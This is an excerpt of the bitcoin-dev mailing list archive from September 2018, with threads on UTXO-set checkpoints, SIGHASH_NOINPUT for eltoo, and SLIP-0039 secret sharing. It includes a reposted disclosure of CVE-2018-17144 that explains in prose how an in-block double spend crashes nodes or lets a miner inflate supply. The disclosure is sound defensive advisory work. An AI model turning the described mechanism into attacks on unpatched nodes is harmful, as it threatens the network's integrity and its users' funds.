I look forward to answering any concerns and also to any offers of help.   I used block 542324 of the Bitcoin blockchain to make a memorable experience using the game of life. I wrote a script for the open-source Game-of-Life software Golly and shared it in the paste at https://pastebin.com/k5Ssc0qk. It produces the image at https://imgur.com/a/rwIQuVz. If someone can tell me how to get a UTXO Set from the bitcoin client, I'll send them $50 of bitcoin. Then I could get the SHA256 hash of that set and try to make a recognizable checkpoint for the Bitcoin blockchain. If someone runs Golly and shares a video of the game playing out (into the apron-shaped image), I'll send them $50 of bitcoin too.

In a few decades when the blockchain has grown to a few terabytes and the UTXO Set is still just a few gigabytes, I'd like to see more people start running full nodes without the hassle of a long wait and loads of storage space. That's what stops me from running one.


--
I like to provide some work at no charge to prove my value. Do you need a techie?
I own Litmocracy<http://www.litmocracy.com> and Meme Racing<http://www.memeracing.net> (in alpha).
I'm the webmaster for The Voluntaryist<http://www.voluntaryist.com> which now accepts Bitcoin.
I also code for The Dollar Vigilante<http://dollarvigilante.com/>.
"He ought to find it more profitable to play by the rules" - Satoshi Nakamoto
-------------- next part --------------
An HTML attachment was scrubbed...
URL: <http://lists.linuxfoundation.org/pipermail/bitcoin-dev/attachments/20180925/2f640b46/attachment-0001.html>

From cryptaxe at gmail.com  Wed Sep 26 00:00:03 2018
From: cryptaxe at gmail.com (CryptAxe)
Date: Tue, 25 Sep 2018 17:00:03 -0700
Subject: [bitcoin-dev] [bitcoin-discuss] Proposal to replace full
 blockchain with recent history plus UTXO Set
In-Reply-To: <PS2P216MB01795F6E52A18C73E20E9D5A9D160@PS2P216MB0179.KORP216.PROD.OUTLOOK.COM>
References: <CAGLBAheT0DB4Aid01vqdkwGJ6U=Fn8A4TU+XKrC=PygdXyvJjg@mail.gmail.com>
	<CAGLBAhcvf6o0J4us3=d0LMmcO_AyZZZtVbsaST9Scth6yX+eSQ@mail.gmail.com>
	<PS2P216MB01795F6E52A18C73E20E9D5A9D160@PS2P216MB0179.KORP216.PROD.OUTLOOK.COM>
Message-ID: <CAF5CFkhY0rYP6yb66jr0MyKBOuTXuQ+Kasz0kJ_NM985YR-wPA@mail.gmail.com>

Feel free to take a look at my implementation of UTXO loading (for core
~0.16.99) here:
https://github.com/DriveNetTESTDRIVE/DriveNet/commit/60189ea9a23865180e25207ecf66f95d84f642c6


Note that this has consensus implications, and that there are bugs (some of
which are fixed in later commits to that repository)


On Tue, Sep 25, 2018 at 4:56 PM Damian Williamson via bitcoin-dev <
bitcoin-dev at lists.linuxfoundation.org> wrote:

> A fairly decent rework would be needed but it seems that the idea has
> merit initially.
>
>
> As it is now, it is not only that a utxo exists but, that the transaction
> it references and the block it is within can also be fully validated.
>
>
> So, if a utxo block set type existed then by consensus every so often a
> bunch of blocks containing just the validated utxo set to a given height,
> say 100,000 blocks below the current blockheight, and necessary header data
> could be appended onto the valid chain and nodes would be free to drop all
> preceding blocks. I suspect that many wouldn't and that even many new nodes
> would still desire to download the full blockchain but, for the use case
> you mention it would make sense.
>
>
> If done [right/wrong] it may even make Satoshi's fortune spendable.
> Something to watch out for.
> ------------------------------
> *From:* bitcoin-discuss-bounces at lists.linuxfoundation.org <
> bitcoin-discuss-bounces at lists.linuxfoundation.org> on behalf of Dave
> Scotese via bitcoin-discuss <bitcoin-discuss at lists.linuxfoundation.org>
> *Sent:* Wednesday, 26 September 2018 1:46:54 AM
> *To:* Bitcoin Discuss
> *Subject:* Re: [bitcoin-discuss] Proposal to replace full blockchain with
> recent history plus UTXO Set
>
> The image at imgur and the pastebin both reference block 542324 but the
> correct block is 542322.  As the pastebin shows, the decimal and hex
> representations I gave for the block height did not match, and this is
> why.  If you use the Merkle root for block 542322 instead of 542324, you'll
> be able to see the correct Game of Life play out and make the apron image.
>
> Dave.
>
> On Sun, Sep 23, 2018 at 11:38 AM Dave Scotese <dscotese at litmocracy.com>
> wrote:
>
> I thought I didn't have access to the dev list and so intended to post the
> following proposal to this discussion list, but used the wrong email
> address.  Anyway, my email did get into the dev list (
> https://lists.linuxfoundation.org/pipermail/bitcoin-dev/2018-September/016420.html)
> but I'll repeat it here:
>
> I've been working on an idea that relieves full nodes of storing the
> entire blockchain. Open source software generally relies on the fact that
> "enough" people agree that it's secure. Bitcoin software works that way
> too. So if you understand enough to see that a UTXO set is valid at a
> certain block height, and there are enough other people who agree and that
> set is recognizable by humans, then we can use that UTXO set and ditch the
> blockchain that existed up to that point. It would save a lot of storage
> and make it a lot easier to run a full node.
>
> Have you reviewed the source code from which your wallets were compiled?
> At some point, we all trust third parties, but generally (at least among
> people who understand Bitcoin) they are large composite groups so that no
> small group or individual can profit from cheating.
>
> I look forward to answering any concerns and also to any offers of help.
> I used block 542324 of the Bitcoin blockchain to make a memorable
> experience using the game of life. I wrote a script for the open-source
> Game-of-Life software Golly and shared it in the paste at
> https://pastebin.com/k5Ssc0qk. It produces the image at
> https://imgur.com/a/rwIQuVz. If someone can tell me how to get a UTXO Set
> from the bitcoin client, I'll send them $50 of bitcoin. Then I could get
> the SHA256 hash of that set and try to make a recognizable checkpoint for
> the Bitcoin blockchain. If someone runs Golly and shares a video of the
> game playing out (into the apron-shaped image), I'll send them $50 of
> bitcoin too.
>
> In a few decades when the blockchain has grown to a few terabytes and the
> UTXO Set is still just a few gigabytes, I'd like to see more people start
> running full nodes without the hassle of a long wait and loads of storage
> space. That's what stops me from running one.
>
>
>
> --
> I like to provide some work at no charge to prove my value. Do you need a
> techie?
> I own Litmocracy <http://www.litmocracy.com> and Meme Racing
> <http://www.memeracing.net> (in alpha).
> I'm the webmaster for The Voluntaryist <http://www.voluntaryist.com>
> which now accepts Bitcoin.
> I also code for The Dollar Vigilante <http://dollarvigilante.com/>.
> "He ought to find it more profitable to play by the rules" - Satoshi
> Nakamoto
> _______________________________________________
> bitcoin-dev mailing list
> bitcoin-dev at lists.linuxfoundation.org
> https://lists.linuxfoundation.org/mailman/listinfo/bitcoin-dev
>
-------------- next part --------------
An HTML attachment was scrubbed...
URL: <http://lists.linuxfoundation.org/pipermail/bitcoin-dev/attachments/20180925/13bd5761/attachment.html>

From kanzure at gmail.com  Wed Sep 26 03:40:32 2018
From: kanzure at gmail.com (Bryan Bishop)
Date: Tue, 25 Sep 2018 22:40:32 -0500
Subject: [bitcoin-dev] CVE-2018-17144 disclosure (inflation vulnerability)
	(copy-paste)
Message-ID: <CABaSBaxq_nPSPc5x3hM5kXqb5cmKDRVTpFSLfbmXpj56PH5h_Q@mail.gmail.com>

It has been informed to me that the writeup for the recent
vulnerability was not distributed to this mailing list. Please find
details at the following blog post:

https://bitcoincore.org/en/2018/09/20/notice/

I believe a release notice was posted but not information about the bug,
https://lists.linuxfoundation.org/pipermail/bitcoin-dev/2018-September/016413.html
https://lists.linuxfoundation.org/pipermail/bitcoin-dev/2018-September/016414.html

There was also further discussion here:
https://lists.linuxfoundation.org/pipermail/bitcoin-dev/2018-September/016424.html

Also, around the time those emails were sent, there was a mailing list
moderator queue bug and nobody was able to approve emails including
myself. This bug was subsequently resolved by Linux Foundation.

The remainder of this email is copy-paste from the bitcoincore.org
page linked above.

=== Full disclosure ===

CVE-2018-17144, a fix for which was released on September 18th in
Bitcoin Core versions 0.16.3 and 0.17.0rc4, includes both a Denial of
Service component and a critical inflation vulnerability. It was
originally reported to several developers working on Bitcoin Core, as
well as projects supporting other cryptocurrencies, including ABC and
Unlimited on September 17th as a Denial of Service bug only, however
we quickly determined that the issue was also an inflation
vulnerability with the same root cause and fix.

In order to encourage rapid upgrades, the decision was made to
immediately patch and disclose the less serious Denial of Service
vulnerability, concurrently with reaching out to miners, businesses,
and other affected systems while delaying publication of the full
issue to give times for systems to upgrade. On September 20th a post
in a public forum reported the full impact and although it was quickly
retracted the claim was further circulated.

At this time we believe over half of the Bitcoin hashrate has upgraded
to patched nodes. We are unaware of any attempts to exploit this
vulnerability.

However, it still remains critical that affected users upgrade and
apply the latest patches to ensure no possibility of large
reorganizations, mining of invalid blocks, or acceptance of invalid
transactions occurs.

=== Technical details ===

In Bitcoin Core 0.14, an optimization was added (Bitcoin Core PR
#9049) which avoided a costly check during initial pre-relay block
validation that multiple inputs within a single transaction did not
spend the same input twice which was added in 2012 (PR #443). While
the UTXO-updating logic has sufficient knowledge to check that such a
condition is not violated in 0.14 it only did so in a sanity check
assertion and not with full error handling (it did, however, fully
handle this case twice in prior to 0.8).

Thus, in Bitcoin Core 0.14.X, any attempts to double-spend a
transaction output within a single transaction inside of a block will
result in an assertion failure and a crash, as was originally
reported.

In Bitcoin Core 0.15, as a part of a larger redesign to simplify
unspent transaction output tracking and correct a resource exhaustion
attack the assertion was changed subtly. Instead of asserting that the
output being marked spent was previously unspent, it only asserts that
it exists.

Thus, in Bitcoin Core 0.15.X, 0.16.0, 0.16.1, and 0.16.2, any attempts
to double-spend a transaction output within a single transaction
inside of a block where the output being spent was created in the same
block, the same assertion failure will occur (as exists in the test
case which was included in the 0.16.3 patch). However, if the output
being double-spent was created in a previous block, an entry will
still remain in the CCoin map with the DIRTY flag set and having been
marked as spent, resulting in no such assertion. This could allow a
miner to inflate the supply of Bitcoin as they would be then able to
claim the value being spent twice.

=== Timeline ===

Timeline for September 17, 2018: (all times UTC)

14:57 anonymous reporter reports crash bug to: Pieter Wuille, Greg
Maxwell, Wladimir Van Der Laan of Bitcoin Core, deadalnix of Bitcoin
ABC, and sickpig of Bitcoin Unlimited.
15:15 Greg Maxwell shares the original report with Cory Fields, Suhas
Daftuar, Alex Morcos and Matt Corallo
17:47 Matt Corallo identifies inflation bug
19:15 Matt Corallo first tries to reach slushpool CEO to have a line
of communication open to apply a patch quickly
19:29 Greg Maxwell timestamps the hash of a test-case which
demonstrates the inflation vulnerability
(a47344b7dceddff6c6cc1c7e97f1588d99e6dba706011b6ccc2e615b88fe4350)
20:15 John Newbery and James O?Beirne are informed of the
vulnerability so they can assist in alerting companies to a pending
patch for a DoS vulnerability
20:30 Matt Corallo speaks with slushpool CTO and CEO and shares patch
with disclosure of the Denial of Service
20:48 slushpool confirmed upgraded
21:08 Alert was sent to Bitcoin ABC that a patch will be posted
publicly by 22:00
21:30 (approx) Responded to original reporter with an acknowledgment
21:57 Bitcoin Core PR 14247 published with patch and test
demonstrating the Denial of Service bug
21:58 Bitcoin ABC publishes their patch
22:07 Advisory email with link to Bitcoin Core PR and patch goes out
to Optech members, among others
23:21 Bitcoin Core version 0.17.0rc4 tagged

September 18, 2018:

00:24 Bitcoin Core version 0.16.3 tagged
20:44 Bitcoin Core release binaries and release announcements were available
21:47 Bitcointalk and reddit have public banners urging people to upgrade

September 19, 2018:

14:06 The mailing list distributes an additional message urging people
to upgrade by Pieter Wuille

September 20, 2018:

19:50 David Jaenson independently discovered the vulnerability, and it
was reported to the Bitcoin Core security contact email.



- Bryan
http://heybryan.org/
1 512 203 0507

From jonasdnick at gmail.com  Wed Sep 26 09:36:57 2018
From: jonasdnick at gmail.com (Jonas Nick)
Date: Wed, 26 Sep 2018 09:36:57 +0000
Subject: [bitcoin-dev] BIP sighash_noinput
In-Reply-To: <CAMZUoK=V9Dii7ja6n6mpW_tWt00PuT=-9Z8XoyKOY3y0_AwK5w@mail.gmail.com>
References: <871sewirni.fsf@gmail.com>
	<CAMZUoK=V9Dii7ja6n6mpW_tWt00PuT=-9Z8XoyKOY3y0_AwK5w@mail.gmail.com>
Message-ID: <feff454d-2cc2-2104-5c6c-69630506bd56@gmail.com>

> At the risk of bikeshedding, shouldn't NOINPUT also zero out the
> hashSequence so that its behaviour is consistent with ANYONECANPAY?

There is a good reason for not doing that. If NOINPUT would sign the
hashSequence then it would be possible to get rid of OP_CSV in eltoo update
scripts. As a result update scripts could be taprootified because the more
common branch (settlement) would be just a 2-of-2 multisig. Applying taproot
would then make unilateral settlement look like a single pubkey spend and avoid
having to reveal the unexecuted (update) branch.

Eltoo update transaction outputs consist of two branches, update and
settlement, where the update branch can be spend by a more recent update
transaction if an obsolete update transaction ends up spending the funding
output. The settlement branch is a 2-of-2 multisig with a relative timelock
using OP_CSV. Removing OP_CSV is possible because both parties signature is
required to spend the update transaction. They will only sign if the input has
the right sequence numbers which is sufficient to enforce the timeout (BIP68) -
assuming they are covered by the signature.

There's a catch: hashSequence includes the sequence numbers of all transaction
inputs. That's not a problem for eltoo because settlement transactions only
have one input. The update mechanism with update transactions relies on being
able to bump the fee by unilaterally adding inputs and and change outputs to
the transaction. That's also not a problem because update spends do not use
relative timelocks and they are signed with SINGLE. So whenever NOINPUT is
combined SINGLE the hashSequence should be zeroed. This is in fact what a
minimal change to the current NOINPUT implementation would naturally do (see
below). However, that's error-prone when using NOINPUT in other contexts so in
general it would be better if NOINPUT would only sign the sequence number of
the corresponding input.

Another downside of this approach is that you can never rebind to an output
with an OP_CSV that requires a larger sequence number, unless you also sign
with SIGHASH_SINGLE. It's difficult to imagine application where this would be
an issue.

This is the modification to the NOINPUT implementation
(https://github.com/cdecker/bitcoin/commits/noinput) which makes eltoo
unilateral closes taprootifiable:
+++ b/src/script/interpreter.cpp
@@ -1223,7 +1223,7 @@ uint256 SignatureHash(const CScript& scriptCode, const CTransaction& txTo, unsig
             hashPrevouts = cacheready ? cache->hashPrevouts : GetPrevoutHash(txTo);
         }

-        if (!(nHashType & SIGHASH_ANYONECANPAY) && (nHashType & 0x1f) != SIGHASH_SINGLE && (nHashType & 0x1f) != SIGHASH_NONE && !noinput) {
+        if (!(nHashType & SIGHASH_ANYONECANPAY) && (nHashType & 0x1f) != SIGHASH_SINGLE && (nHashType & 0x1f) != SIGHASH_NONE) {
             hashSequence = cacheready ? cache->hashSequence : GetSequenceHash(txTo);
         }

On 5/1/18 4:58 PM, Russell O'Connor via bitcoin-dev wrote:
> At the risk of bikeshedding, shouldn't NOINPUT also zero out the
> hashSequence so that its behaviour is consistent with ANYONECANPAY?
> 
> On Mon, Apr 30, 2018 at 12:29 PM, Christian Decker via bitcoin-dev <
> bitcoin-dev at lists.linuxfoundation.org> wrote:
> 
>> Hi all,
>>
>> I'd like to pick up the discussion from a few months ago, and propose a new
>> sighash flag, `SIGHASH_NOINPUT`, that removes the commitment to the
>> previous
>> output. This was previously mentioned on the list by Joseph Poon [1], but
>> was
>> never formally proposed, so I wrote a proposal [2].
>>
>> We have long known that `SIGHASH_NOINPUT` would be a great fit for
>> Lightning.
>> They enable simple watch-towers, i.e., outsource the need to watch the
>> blockchain for channel closures, and react appropriately if our
>> counterparty
>> misbehaves. In addition to this we just released the eltoo [3,4] paper
>> which
>> describes a simplified update mechanism that can be used in Lightning, and
>> other
>> off-chain contracts, with any number of participants.
>>
>> By not committing to the previous output being spent by the transaction,
>> we can
>> rebind an input to point to any outpoint with a matching output script and
>> value. The binding therefore is no longer explicit through a reference, but
>> through script compatibility, and the transaction ID reference in the
>> input is a
>> hint to validators. The sighash flag is meant to enable some off-chain
>> use-cases
>> and should not be used unless the tradeoffs are well-known. In particular
>> we
>> suggest using contract specific key-pairs, in order to avoid having any
>> unwanted
>> rebinding opportunities.
>>
>> The proposal is very minimalistic, and simple. However, there are a few
>> things
>> where we'd like to hear the input of the wider community with regards to
>> the
>> implementation details though. We had some discussions internally on
>> whether to
>> use a separate opcode or a sighash flag, some feeling that the sighash flag
>> could lead to some confusion with existing wallets, but given that we have
>> `SIGHASH_NONE`, and that existing wallets will not sign things with unknown
>> flags, we decided to go the sighash way. Another thing is that we still
>> commit
>> to the amount of the outpoint being spent. The rationale behind this is
>> that,
>> while rebinding to outpoints with the same value maintains the value
>> relationship between input and output, we will probably not want to bind to
>> something with a different value and suddenly pay a gigantic fee.
>>
>> The deployment part of the proposal is left vague on purpose in order not
>> to
>> collide with any other proposals. It should be possible to introduce it by
>> bumping the segwit script version and adding the new behavior.
>>
>> I hope the proposal is well received, and I'm looking forward to discussing
>> variants and tradeoffs here. I think the applications we proposed so far
>> are
>> quite interesting, and I'm sure there are many more we can enable with this
>> change.
>>
>> Cheers,
>> Christian
>>
>> [1] https://lists.linuxfoundation.org/pipermail/bitcoin-dev/
>> 2016-February/012460.html
>> [2] https://github.com/cdecker/bips/blob/noinput/bip-xyz.mediawiki
>> [3] https://blockstream.com/2018/04/30/eltoo-next-lightning.html
>> [4] https://blockstream.com/eltoo.pdf
>> _______________________________________________
>> bitcoin-dev mailing list
>> bitcoin-dev at lists.linuxfoundation.org
>> https://lists.linuxfoundation.org/mailman/listinfo/bitcoin-dev
>>
> 
> 
> _______________________________________________
> bitcoin-dev mailing list
> bitcoin-dev at lists.linuxfoundation.org
> https://lists.linuxfoundation.org/mailman/listinfo/bitcoin-dev
> 

From andrew.kozlik at satoshilabs.com  Wed Sep 26 12:12:40 2018
From: andrew.kozlik at satoshilabs.com (Andrew Kozlik)
Date: Wed, 26 Sep 2018 14:12:40 +0200
Subject: [bitcoin-dev] SLIP-0039: Shamir's Secret-Sharing for Mnemonic
 Codes
In-Reply-To: <CACrqygCoqFMFLTpn5PSMR2_wSHnWsXSyZZ_jhk-FbvZHwwz4nA@mail.gmail.com>
References: <4e2c7b41-1e16-b89a-04d8-776f3469141a@satoshilabs.com>
	<CACrqygCoqFMFLTpn5PSMR2_wSHnWsXSyZZ_jhk-FbvZHwwz4nA@mail.gmail.com>
Message-ID: <5c36fdb3-304f-ce43-d41a-0c1d66c7cc41@satoshilabs.com>

Thanks for your input Christopher. Since we already have the discussion
about your comments running under the issues in the SLIPs repo on Github
(https://github.com/satoshilabs/slips/issues), let's continue it there.

Andrew Kozlik


On 21.9.2018 21:29, Christopher Allen wrote:
> On Fri, Sep 21, 2018 at 11:18 AM Andrew Kozlik via bitcoin-dev
> <bitcoin-dev at lists.linuxfoundation.org
> <mailto:bitcoin-dev at lists.linuxfoundation.org>> wrote:
>
>     We are currently writing a new specification for splitting BIP-32
>     master
>     seeds into multiple mnemonics using Shamir's secret sharing scheme. We
>     would be interested in getting your feedback with regard to the
>     high-level design of the new spec:
>     https://github.com/satoshilabs/slips/blob/master/slip-0039.md
>     Please focus your attention on the section entitled "Master secret
>     derivation functions", which proposes several different solutions.
>     Note
>     that there is a Design Rationale section at the very end of the
>     document, which should answer some of the questions you may have. The
>     document is a work in progress and we are aware that some technical
>     details have not been fully specified. These will be completed
>     once the
>     high level design has been settled.
>
>
> I and a number of companies & communities I am involved with are very
> interested in this.?
>
> A challenge is that Shamir Secret Sharing has subtleties. To quote
> Greg Maxwell:
>
> > I think Shamir Secret Sharing (and a number of other things, RNGs
> for example), suffer from a property where they are just complex
> enough that people are excited to implement them often for little good
> reason, and then they are complex enough (or have few enough reasons
> to invest significant time) they implement them poorly?.
>
> Some questions for you:
>
> * What other teams or communities besides Trezor are committed to
> standardizing a Shamir Secret Sharing Scheme? I can say that the
> #RebootingWebOfTrust community (meeting again for the 7th time next
> week in Toronto https://rwot7.eventbrite.com) are very interested.
>
> * Where do you want to hold discussions on this? Do people object to
> having this discussion on this mailing list? Or should it be?issues in
> SLIPS repo or on some other mailing list??
>
> * Presuming a successful split of secrets, I don?t know all the
> adversarial problems that are associated with recovery of a SSS. As
> this would be an interactive event, I presume an attacker can DOS a
> request to reassemble keys (so maybe some the of integrity of each
> share vs all is required). And of course there are the biggest
> problems: ?impersonation of a reassembly request and a MitM of a
> reassembly request. Are there other attacks? Are you trying to
> mitigate any of these?
>
> Two comments:
>
> * The Lightning Network community has added to their BIP32 mnemonics
> the ability to have a birthday in the seed, to make it easier ?to scan
> the blockchain for keys, as well as a byte with some way to know how
> to derive keys paths for it. I don?t seee a BOLT for this (it was
> mentioned
> in?https://bitcoin.stackexchange.com/questions/74805/what-is-birthday-in-the-context-of-bip39-lightning-seed-generation)
> ?I would suggest that you also get some of their latest thoughts and
> incorporate them.
>
> * I worked with Chris Vickery while at Blockstrham on various possible
> ways to improve mnemonic word lists. I?m not suggesting that you
> necessarily go as far as we did to try to create a mnemonic that is
> iambic pentameter poetry (inspired by
> https://www.isi.edu/natural-language/mt/memorize-random-60.pdf),
> however, we did find sources for words that are concrete (for example
> table is more concrete than truth
> http://crr.ugent.be/papers/Brysbaert_Warriner_Kuperman_BRM_Concreteness_ratings.pdf
> ) or have strong emotional valence attachment (truth is more emotional
> than table), both of which make can words more memorable. I also found
> lists of words that are hard to pronounce unless you are English
> native, and eliminated them from my own list.?
>
> Among the results of this was a new BIP-39 2048 word compatible word
> list filtered for memorability (concreteness & emotional valence) and
> suitability for iambic pentameter, which is located:
>
> ? ?
> https://github.com/ChristopherA/iambic-mnemonic/blob/master/word-lists/iambic-wordlist.json?
>
> ?which was created from the repo at
>
> ? ? https://github.com/ChristopherA/password_poem
>
> You can a number of other word lists that I?ve collected here
> https://github.com/ChristopherA/iambic-mnemonic/blob/master/word-lists/
>
> If you want to replicate what we did with your own criteria, you may
> want to incorporate information from the CMU
> dictitionary?http://www.speech.cs.cmu.edu/cgi-bin/cmudict, the top
> 5000
> words?https://github.com/ChristopherA/password_poem/blob/master/top5000.json,
> ?concrete word lists
> http://crr.ugent.be/papers/Concreteness_ratings_Brysbaert_et_al_BRM.txt
> and emotional words ?(valence)?http://crr.ugent.be/archives/1003
>
> ? Christopher Allen
>
>
>
>
>
>
>

-------------- next part --------------
An HTML attachment was scrubbed...
URL: <http://lists.linuxfoundation.org/pipermail/bitcoin-dev/attachments/20180926/8bf2bddf/attachment-0001.html>

From andrew.kozlik at satoshilabs.com  Wed Sep 26 13:44:16 2018
From: andrew.kozlik at satoshilabs.com (Andrew Kozlik)
Date: Wed, 26 Sep 2018 15:44:16 +0200
Subject: [bitcoin-dev] SLIP-0039: Shamir's Secret-Sharing for Mnemonic
 Codes
In-Reply-To: <CAF8cz+pxaEpg9FtqmegxAZyGWGb1Z2P8rJCCAVerLhMZ5B8xOA@mail.gmail.com>
References: <4e2c7b41-1e16-b89a-04d8-776f3469141a@satoshilabs.com>
	<CAF8cz+pxaEpg9FtqmegxAZyGWGb1Z2P8rJCCAVerLhMZ5B8xOA@mail.gmail.com>
Message-ID: <476d1af6-2e65-961c-bcf7-74e21b207def@satoshilabs.com>

Thank you for your input Ignacio. Looking at your proposal, I see that
its main feature is that it makes one of the shares privileged in the
sense that it must always take part in the reconstruction of the master
secret, while the remaining shares follow the K-of-M scheme. This is an
interesting idea.

To answer your questions:

> Your proposed work provides a way to split the pre-secret into SSS
> shares, a format of encoding the shares, and finally several methods
> to derive the master secret from the pre-secret. Would you envision
> standarizing these different topics under the same proposal?
We intend standardize the encoding format, splitting of the pre-master
secret into shares and the derivation of the master secret from the
pre-master secret in a single document. However, note that only one of
the four proposed master secret derivation functions will be selected
for the final version.

> Also, have you thought of a way to deal with the existing legacy
> privatekeys already encoded into BIP-0039, or stored in other formats,
> and how to migrate them securely into a schema of encoded SSS shares?
Three of the four proposed master secret derivation functions are
symmetric, which means that they allow users to migrate any existing
master secret (including a BIP-0039 mnemonic) to the new scheme.

Thanks,
Andrew Kozlik


On 24.9.2018 21:49, Ignacio Berrozpe wrote:
> Hi Andrew
>
> Please allow me to comment on your work, as I happened to publish an
> article 5 months ago proposing SSS to split bitcoins private keys into
> shares that could be encoded directly using BIP-0039 mnemonic words.
> While cryptographically much simpler than your proposal, the proposal
> had the characteristic that it could be applied directly to existing
> private keys backups, by splitting the keys into SSS shares that could
> benefit from the existing BIP-0039 mnemonic to encode directly the
> shares. I thought it would be a simple path for hardware wallets
> providers such as Trezor into providing a better/more secure
> alternative the existing BIP-0039 privatekey backups of 24 words.
>
> The article can be found here, and I've enclosed a simplified version
>
> https://privatekeys.org/2018/04/24/k-of-m-private-key-generation-and-backup-in-bitcoin-wallets/
>
> Mind two questions? Your proposed work provides a way to split the
> pre-secret into SSS shares, a format of encoding the shares, and
> finally several methods to derive the master secret from the
> pre-secret. Would you envision standarizing these different topics
> under the same proposal? Also, have you thought of a way to deal with
> the existing legacy privatekeys already encoded into BIP-0039, or
> stored in other formats, and how to migrate them securely into a
> schema of encoded SSS shares?
>
> Best regards
> Ignacio Berrozpe
>
>
>
>
>
>
>
> On Fri, Sep 21, 2018 at 8:18 PM Andrew Kozlik via bitcoin-dev
> <bitcoin-dev at lists.linuxfoundation.org
> <mailto:bitcoin-dev at lists.linuxfoundation.org>> wrote:
>
>     Hello everyone,
>
>     We are currently writing a new specification for splitting BIP-32
>     master
>     seeds into multiple mnemonics using Shamir's secret sharing scheme. We
>     would be interested in getting your feedback with regard to the
>     high-level design of the new spec:
>     https://github.com/satoshilabs/slips/blob/master/slip-0039.md
>     Please focus your attention on the section entitled "Master secret
>     derivation functions", which proposes several different solutions.
>     Note
>     that there is a Design Rationale section at the very end of the
>     document, which should answer some of the questions you may have. The
>     document is a work in progress and we are aware that some technical
>     details have not been fully specified. These will be completed
>     once the
>     high level design has been settled.
>
>     Thanks,
>
>     Andrew Kozlik
>     TREZOR Team
>
>
>     _______________________________________________
>     bitcoin-dev mailing list
>     bitcoin-dev at lists.linuxfoundation.org
>     <mailto:bitcoin-dev at lists.linuxfoundation.org>
>     https://lists.linuxfoundation.org/mailman/listinfo/bitcoin-dev
>

-------------- next part --------------
An HTML attachment was scrubbed...
URL: <http://lists.linuxfoundation.org/pipermail/bitcoin-dev/attachments/20180926/006223da/attachment.html>

From jl2012 at xbt.hk  Wed Sep 26 19:45:49 2018
From: jl2012 at xbt.hk (Johnson Lau)
Date: Thu, 27 Sep 2018 03:45:49 +0800
Subject: [bitcoin-dev] BIP sighash_noinput
In-Reply-To: <feff454d-2cc2-2104-5c6c-69630506bd56@gmail.com>
References: <871sewirni.fsf@gmail.com>
	<CAMZUoK=V9Dii7ja6n6mpW_tWt00PuT=-9Z8XoyKOY3y0_AwK5w@mail.gmail.com>
	<feff454d-2cc2-2104-5c6c-69630506bd56@gmail.com>
Message-ID: <D3D0114C-0D5C-4EE4-AD48-B046551BAAD4@xbt.hk>

In BIP143, the nSequence of the same input is always signed, with any hashtype. Why do you need to sign the sequence of other inputs?

> On 26 Sep 2018, at 5:36 PM, Jonas Nick via bitcoin-dev <bitcoin-dev at lists.linuxfoundation.org> wrote:
> 
>> At the risk of bikeshedding, shouldn't NOINPUT also zero out the
>> hashSequence so that its behaviour is consistent with ANYONECANPAY?
> 
> There is a good reason for not doing that. If NOINPUT would sign the
> hashSequence then it would be possible to get rid of OP_CSV in eltoo update
> scripts. As a result update scripts could be taprootified because the more
> common branch (settlement) would be just a 2-of-2 multisig. Applying taproot
> would then make unilateral settlement look like a single pubkey spend and avoid
> having to reveal the unexecuted (update) branch.
> 
> Eltoo update transaction outputs consist of two branches, update and
> settlement, where the update branch can be spend by a more recent update
> transaction if an obsolete update transaction ends up spending the funding
> output. The settlement branch is a 2-of-2 multisig with a relative timelock
> using OP_CSV. Removing OP_CSV is possible because both parties signature is
> required to spend the update transaction. They will only sign if the input has
> the right sequence numbers which is sufficient to enforce the timeout (BIP68) -
> assuming they are covered by the signature.
> 
> There's a catch: hashSequence includes the sequence numbers of all transaction
> inputs. That's not a problem for eltoo because settlement transactions only
> have one input. The update mechanism with update transactions relies on being
> able to bump the fee by unilaterally adding inputs and and change outputs to
> the transaction. That's also not a problem because update spends do not use
> relative timelocks and they are signed with SINGLE. So whenever NOINPUT is
> combined SINGLE the hashSequence should be zeroed. This is in fact what a
> minimal change to the current NOINPUT implementation would naturally do (see
> below). However, that's error-prone when using NOINPUT in other contexts so in
> general it would be better if NOINPUT would only sign the sequence number of
> the corresponding input.
> 
> Another downside of this approach is that you can never rebind to an output
> with an OP_CSV that requires a larger sequence number, unless you also sign
> with SIGHASH_SINGLE. It's difficult to imagine application where this would be
> an issue.
> 
> This is the modification to the NOINPUT implementation
> (https://github.com/cdecker/bitcoin/commits/noinput) which makes eltoo
> unilateral closes taprootifiable:
> +++ b/src/script/interpreter.cpp
> @@ -1223,7 +1223,7 @@ uint256 SignatureHash(const CScript& scriptCode, const CTransaction& txTo, unsig
>             hashPrevouts = cacheready ? cache->hashPrevouts : GetPrevoutHash(txTo);
>         }
> 
> -        if (!(nHashType & SIGHASH_ANYONECANPAY) && (nHashType & 0x1f) != SIGHASH_SINGLE && (nHashType & 0x1f) != SIGHASH_NONE && !noinput) {
> +        if (!(nHashType & SIGHASH_ANYONECANPAY) && (nHashType & 0x1f) != SIGHASH_SINGLE && (nHashType & 0x1f) != SIGHASH_NONE) {
>             hashSequence = cacheready ? cache->hashSequence : GetSequenceHash(txTo);
>         }
> 
> On 5/1/18 4:58 PM, Russell O'Connor via bitcoin-dev wrote:
>> At the risk of bikeshedding, shouldn't NOINPUT also zero out the
>> hashSequence so that its behaviour is consistent with ANYONECANPAY?
>> 
> 



From jonasdnick at gmail.com  Wed Sep 26 20:40:02 2018
From: jonasdnick at gmail.com (Jonas Nick)
Date: Wed, 26 Sep 2018 20:40:02 +0000
Subject: [bitcoin-dev] BIP sighash_noinput
In-Reply-To: <D3D0114C-0D5C-4EE4-AD48-B046551BAAD4@xbt.hk>
References: <871sewirni.fsf@gmail.com>
	<CAMZUoK=V9Dii7ja6n6mpW_tWt00PuT=-9Z8XoyKOY3y0_AwK5w@mail.gmail.com>
	<feff454d-2cc2-2104-5c6c-69630506bd56@gmail.com>
	<D3D0114C-0D5C-4EE4-AD48-B046551BAAD4@xbt.hk>
Message-ID: <7bb51255-bfe5-8f11-55ae-ddabebe76941@gmail.com>

Oh, I missed that that's still the case with NOINPUT - thanks for pointing it
out. In that case there's no reason to sign the other inputs' sequence and
that's even better because the current NOINPUT proposal already enables
taprootifiability of eltoo unilateral closings.

On 9/26/18 7:45 PM, Johnson Lau wrote:
> In BIP143, the nSequence of the same input is always signed, with any hashtype. Why do you need to sign the sequence of other inputs?
> 
>> On 26 Sep 2018, at 5:36 PM, Jonas Nick via bitcoin-dev <bitcoin-dev at lists.linuxfoundation.org> wrote:
>>
>>> At the risk of bikeshedding, shouldn't NOINPUT also zero out the
